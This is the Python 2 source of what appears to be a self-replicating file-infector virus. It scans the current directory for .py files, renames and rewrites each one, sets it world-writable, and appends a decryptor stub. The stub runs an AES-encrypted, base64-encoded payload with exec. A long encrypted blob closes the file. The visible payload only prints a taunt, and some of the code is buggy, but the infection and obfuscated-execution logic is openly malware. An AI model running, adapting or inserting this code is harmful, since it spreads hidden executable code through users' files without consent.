import os
def is_infected(filename):
   f = open(filename, 'r')
   lines = f.readlines()
   if len(lines) < 46:
      return False
   #print len(lines)
   #print lines[len(lines) - 46]
   return lines[len(lines) - 46].startswith('######################################################## First script python')

def infect(filename):
   os.rename(filename, filename + '-copy')

   destination = open(filename, 'w')
   os.chmod(filename, 0777)
   source = open(filename + '-copy', 'r')
   this = open(__main__.__file__, 'r')

   # Append the original file
   for line in source:
      destination.write(line)

   destination.write("\n######################################################## First script python\n")
   destination.write("# coding=utf-8\n")
   destination.write("# Start Unencrypted\n")

   copy = False
   result = ''
   for line in this:
      if line.strip() == '# Start Unencrypted':
         copy = True
      elif line.strip() == '# End Unencrypted':
         destination.write('# End Unencrypted')
         copy = False
      elif copy:
         destination.write(line);

   destination.write("\n# Start payload\n")
   destination.write("#")
   destination.write(str(encrypt(e, filename)))
   destination.write("\n# End payload")

   os.remove(filename + '-copy')
   source.close()
   destination.close()
   this.close()

def find_and_infect_files():
   # In the current directory
   path = '.'
   dirs = os.listdir(path)

   # For each file try to infect it
   for filename in dirs:
      if filename.endswith('.py') and (not is_infected(filename)) and (filename != "virus.py"):
         print "Infected " +  str(filename)
         infect(filename)

def encrypt(data,filename):
   source = open(filename + '-copy', 'r')

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(source).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   source.close()
   return base64.b64encode(encrypted)
 ####################

def payload():
   print "This file is infected infected! Mhuahauhauahau!"

find_and_infect_files()
payload()
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
# Start payload
#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
# End payload